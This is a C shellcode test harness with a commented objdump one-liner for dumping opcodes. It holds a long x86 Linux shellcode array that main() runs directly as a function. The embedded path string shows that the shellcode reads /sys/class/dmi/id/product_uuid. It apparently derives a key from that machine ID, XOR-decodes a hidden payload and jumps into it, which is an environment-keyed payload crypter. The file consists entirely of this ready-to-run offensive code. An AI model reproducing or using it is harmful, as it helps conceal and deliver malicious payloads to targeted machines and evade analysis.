
//for i in `objdump -d decryptor | tr '\t' ' ' | tr ' ' '\n' | egrep '^[0-9a-f]{2}$' ` ; do echo -n "\x$i" ; done

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

unsigned char shellcode[] =  
"\x31\xc0\x31\xdb\x31\xd2\x31\xc9\x55\x89\xe5\x83\xec\x2c\x83\xec\x38\x83\xec\x26\x83\xec\x26\x8b\x5d\xfc\x31\xdb\x89\x5d\xfc\x8b\x5d\xf8\x31\xdb\x89\x5d\xf8\x8b\x5d\xec\x31\xdb\x89\x5d\xec\x8b\x5d\xe8\x31\xdb\x89\x5d\xe8\x8b\x5d\xf4\x31\xdb\x89\x5d\xf4\x8b\x5d\xe4\x31\xdb\x89\x5d\xe4\xc7\x45\xe0\x41\x41\x41\x41\xc7\x45\xdc\x13\xd2\xb1\x0a\x31\xdb\x43\x89\x5d\xd8\xc7\x45\xbe\x03\xeb\x7c\x58\xc7\x45\xc2\x03\x08\x43\x59\xc7\x45\xc6\x44\x09\x48\x4d\xc7\x45\xca\x5e\xac\xc7\x7e\xc7\x45\xce\xa7\xc1\x75\xad\xc7\x45\xd2\xcc\x95\x23\xe8\x31\xdb\xb3\xb1\x88\x5d\xd6\x8b\x5d\xf8\x31\xdb\x89\x5d\xf8\x83\xec\x28\xbb\x11\x82\x04\x08\x31\xc0\xb0\x05\x31\xc9\xb1\x02\xcd\x80\x89\xc3\x89\xe1\x31\xd2\xb2\x24\x31\xc0\xb0\x03\xcd\x80\x31\xc0\x8b\x1c\x24\x01\xd8\x8b\x5c\x24\x04\x01\xd8\x8b\x5c\x24\x08\x01\xd8\x8b\x5c\x24\x0c\x01\xd8\x8b\x5c\x24\x10\x01\xd8\x8b\x5c\x24\x14\x01\xd8\x8b\x5c\x24\x18\x01\xd8\x8b\x5c\x24\x1c\x01\xd8\x8b\x5c\x24\x20\x01\xd8\x89\x45\xf0\x31\xdb\x81\xc3\xdb\x02\x96\x49\x81\xc3\x25\xfd\x69\x36\x89\x5d\xe8\x8b\x45\xdc\x0f\xaf\x45\xf0\x89\xc2\x8b\x45\xd8\x01\xd0\x8b\x4d\xe8\x31\xd2\xf7\xf1\x89\x55\xf0\x8b\x45\xf0\x89\x45\xf4\x8b\x45\xfc\x8d\x50\x01\x89\x55\xfc\x8b\x55\xf4\x89\xd1\xc1\xf9\x1f\xc1\xe9\x1c\x01\xca\x83\xe2\x0f\x29\xca\x83\xc2\x23\x88\x94\x05\x5a\xff\xff\xff\x8b\x45\xf4\x8d\x50\x0f\x85\xc0\x0f\x48\xc2\xc1\xf8\x04\x89\x45\xf4\x31\xdb\x39\x5d\xf4\x75\xc3\x83\x45\xf8\x01\x83\x7d\xf8\x09\x7e\x8a\x31\xdb\x89\x5d\xfc\x8d\x55\xbe\x8b\x45\xfc\x01\xd0\x31\xdb\x31\xd2\x8a\x18\x88\xda\x8d\x8d\x5a\xff\xff\xff\x8b\x45\xfc\x01\xc8\x31\xdb\x8a\x18\x31\xc0\x88\xd8\x31\xd0\x8d\x4d\xbe\x8b\x55\xfc\x01\xca\x88\x02\x83\x45\xfc\x01\x83\x7d\xfc\x18\x7e\xc7\x31\xc0\x8d\x45\xbe\xff\xe0\x31\xc0\xb0\x01\x31\xdb\xcd\x80\x2f\x73\x79\x73\x2f\x63\x6c\x61\x73\x73\x2f\x64\x6d\x69\x2f\x69\x64\x2f\x70\x72\x6f\x64\x75\x63\x74\x5f\x75\x75\x69\x64";

int main(void)  
{

    printf("Shellcode Length:  %d\n", strlen(shellcode));

    int (*shell_spawn)() = (int(*)())shellcode;

    shell_spawn();
    return(EXIT_SUCCESS);

}
